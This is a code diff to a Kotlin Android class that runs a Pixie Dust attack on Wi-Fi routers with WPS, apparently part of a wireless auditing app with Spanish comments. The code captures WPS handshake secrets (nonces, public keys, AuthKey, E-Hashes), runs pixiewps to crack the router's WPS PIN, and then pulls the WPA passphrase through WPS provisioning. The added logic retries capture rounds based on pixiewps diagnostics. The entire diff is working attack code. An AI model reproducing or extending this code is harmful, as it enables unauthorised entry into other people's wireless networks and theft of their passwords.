@@ -231,8 +231,11 @@ internal class PixieDustRunner(
             var m3Data: M3Parser.M3Data? = null
             var m5m7: M3Parser.M5M7Capture? = null
             var captureReason: String? = null
+            var wpsPin: String? = null
+            var pixieFailureReason: String? = null
 
-            // Intentar capturar el M3 en varias rondas (frescas claves DH cada ronda).
+            // Cada ronda captura claves DH frescas. El diagnóstico de pixiewps
+            // de una ronda ajusta la siguiente (modo, tiempo y ventana M5/M7).
             for (round in 1..MAX_ATTACK_ROUNDS) {
                 ensureActive()
                 if (assocRejectTracker.exhausted()) {
@@ -242,7 +245,7 @@ internal class PixieDustRunner(
                     break
                 }
                 if (round > 1) {
-                    log("[*] M3 capture failed in previous round, restarting supplicant for round $round/$MAX_ATTACK_ROUNDS")
+                    log("[*] Ronda $round/$MAX_ATTACK_ROUNDS con datos frescos")
                     delay((1_000L * round).coerceAtMost(3_000L))
                 }
 
@@ -272,31 +275,77 @@ internal class PixieDustRunner(
                 m5m7 = attempt.m5m7
                 captureReason = attempt.failureReason
 
-                if (m3Data != null) {
-                    log("[+] M3 captured (round $round/$MAX_ATTACK_ROUNDS)")
-                    // Cierra la sesión WPS en el AP antes de matar el
-                    // supplicant: si solo se mata, el AP mantiene la sesión
-                    // abierta y la extracción de PSK (que empieza enseguida)
-                    // choca con ella.
-                    supplicant.cancelWps(interfaceName, ::log)
-                    supplicant.stopAndFlush(handle, rawOutput, ::log)
-                    currentSupplicant = null
+                if (m3Data == null) {
+                    if (attempt.terminal) {
+                        // El AP abortó la negociación (p. ej. WPS Setup Locked):
+                        // reiniciar el supplicant no cambia el estado del AP.
+                        supplicant.stopAndFlush(handle, rawOutput, ::log)
+                        currentSupplicant = null
+                        break
+                    }
+                    continue
+                }
+
+                log("[+] M3 captured (round $round/$MAX_ATTACK_ROUNDS)")
+                // Cierra la sesión WPS en el AP antes de matar el supplicant:
+                // si solo se mata, el AP mantiene la sesión abierta y la
+                // extracción de PSK choca con ella.
+                supplicant.cancelWps(interfaceName, ::log)
+                supplicant.stopAndFlush(handle, rawOutput, ::log)
+                currentSupplicant = null
+
+                log("[+] M3 captured:")
+                log("    E-Nonce: ${m3Data.enrolleeNonce}")
+                log("    PKE (peer key): ${m3Data.peerPublicKey}")
+                log("    PKR (own key): ${m3Data.ownPublicKey}")
+                log("    AuthKey: ${m3Data.authKey}")
+                log("    E-Hash1: ${m3Data.eHash1}")
+                log("    E-Hash2: ${m3Data.eHash2}")
+                if (m5m7 != null && m5m7.hasBoth()) {
+                    log("[*] M5/M7 capturados: M5=${m5m7.m5Enc?.length ?: 0} hex, " +
+                        "M7=${m5m7.m7Enc?.length ?: 0} hex")
+                }
+
+                stage(PixieDustStage.ANALYZING)
+                log("[*] Running pixiewps ...")
+                val invocation = pixiewps.buildCommand(bssid, m3Data, m5m7)
+                log("[*] Pixiewps mode: ${invocation.plan.reason}")
+                log("[*] Pixiewps command: ${invocation.command}")
+                val outputStart = rawOutput.length
+                val pin = pixiewps.run(invocation, rawOutput, ::log)
+                val diagnosis = PixieDiagnosisParser.parse(rawOutput.substring(outputStart))
+                log("[*] Diagnóstico pixiewps: ${diagnosis.kind.name} -> ${diagnosis.action.name}")
+                diagnosis.mode?.let { log("[*] Modo detectado por pixiewps: $it") }
+
+                if (pin != null) {
+                    wpsPin = pin
+                    log("[+] WPS PIN found: $pin")
                     break
                 }
-                if (attempt.terminal) {
-                    // El AP abortó la negociación (p. ej. WPS Setup Locked).
-                    // Reiniciar el supplicant no cambia el estado del AP, así
-                    // que no tiene sentido consumir las rondas restantes.
-                    // El motivo se registra una sola vez al salir del bucle.
-                    supplicant.stopAndFlush(handle, rawOutput, ::log)
-                    currentSupplicant = null
-                    break
+                log("[-] WPS pin not found")
+
+                val canRetry = diagnosis.action == PixieNextAction.RETRY_WITH_NEW_DATA
+                if (canRetry && round < MAX_ATTACK_ROUNDS) {
+                    log("[*] Reintentando con datos frescos según el diagnóstico")
+                    continue
                 }
+                pixieFailureReason = when {
+                    diagnosis.action == PixieNextAction.RETRY_WITH_NEW_DATA ->
+                        strings(R.string.pixie_reason_retry_new_data, emptyArray())
+                    diagnosis.kind == PixieDiagnosisKind.PROCESS_ERROR ||
+                        diagnosis.kind == PixieDiagnosisKind.UNSUPPORTED_SETUP ->
+                        strings(R.string.pixie_reason_pixiewps_error, emptyArray())
+                    else -> strings(R.string.pixie_not_vulnerable, emptyArray())
+                }
+                break
             }
 
-            if (m3Data == null) {
-                val reason = captureReason
-                    ?: strings(R.string.pixie_reason_no_m3_data, emptyArray())
+            if (wpsPin == null) {
+                val reason = if (m3Data == null) {
+                    captureReason ?: strings(R.string.pixie_reason_no_m3_data, emptyArray())
+                } else {
+                    pixieFailureReason ?: strings(R.string.pixie_not_vulnerable, emptyArray())
+                }
                 log("[-] $reason")
                 val failure = PixieDustResult.Failure(
                     bssid = bssid,
@@ -307,38 +356,9 @@ internal class PixieDustRunner(
                 return@withContext failure
             }
 
-            log("[+] M3 captured:")
-            log("    E-Nonce: ${m3Data.enrolleeNonce}")
-            log("    PKE (peer key): ${m3Data.peerPublicKey}")
-            log("    PKR (own key): ${m3Data.ownPublicKey}")
-            log("    AuthKey: ${m3Data.authKey}")
-            log("    E-Hash1: ${m3Data.eHash1}")
-            log("    E-Hash2: ${m3Data.eHash2}")
-
-            val capturedM3 = m3Data
-            val capturedM5M7 = m5m7
-            if (capturedM5M7 != null && capturedM5M7.hasBoth()) {
-                log(
-                    "[*] Pixiewps mode 3 (RTL819x): " +
-                        "M5=${capturedM5M7.m5Enc?.length ?: 0} hex, " +
-                        "M7=${capturedM5M7.m7Enc?.length ?: 0} hex"
-                )
-            } else {
-                log("[*] Pixiewps args: ${capturedM3.toPixiewpsArgs()}")
-            }
-
-            // --- Ejecutar pixiewps ---
-            stage(PixieDustStage.ANALYZING)
-            log("[*] Running pixiewps ...")
-            val pixieCmd = pixiewps.buildCommand(capturedM3, capturedM5M7)
-            log("[*] Pixiewps command: $pixieCmd")
-
-            val wpsPin = pixiewps.run(pixieCmd, rawOutput, ::log)
-            log(if (wpsPin != null) "[+] WPS PIN found: $wpsPin" else "[-] WPS pin not found")
-
             var wpaPsk: String? = null
             val targetSsid = ssid?.takeIf { it.isNotBlank() }
-            if (wpsPin != null && targetSsid != null) {
+            if (targetSsid != null) {
                 stage(PixieDustStage.EXTRACTING_PSK)
                 log("[*] Obtaining WPA PSK via WPS provisioning...")
                 wpaPsk = pskExtractor.extract(
@@ -354,29 +374,19 @@ internal class PixieDustRunner(
                 } else {
                     log("[-] WPA PSK not obtained")
                 }
-            } else if (wpsPin != null) {
+            } else {
                 log("[*] Skipping PSK extraction (SSID unknown or empty)")
             }
 
-            if (wpsPin != null) {
-                val success = PixieDustResult.Success(
-                    bssid = bssid,
-                    ssid = ssid,
-                    wpsPin = wpsPin,
-                    wpaPsk = wpaPsk,
-                    rawOutput = rawOutput.toString()
-                )
-                auditResult = success
-                return@withContext success
-            } else {
-                val failure = PixieDustResult.Failure(
-                    bssid = bssid,
-                    reason = strings(R.string.pixie_not_vulnerable, emptyArray()),
-                    rawOutput = rawOutput.toString()
-                )
-                auditResult = failure
-                return@withContext failure
-            }
+            val success = PixieDustResult.Success(
+                bssid = bssid,
+                ssid = ssid,
+                wpsPin = wpsPin,
+                wpaPsk = wpaPsk,
+                rawOutput = rawOutput.toString()
+            )
+            auditResult = success
+            return@withContext success
 
         } finally {
             try {
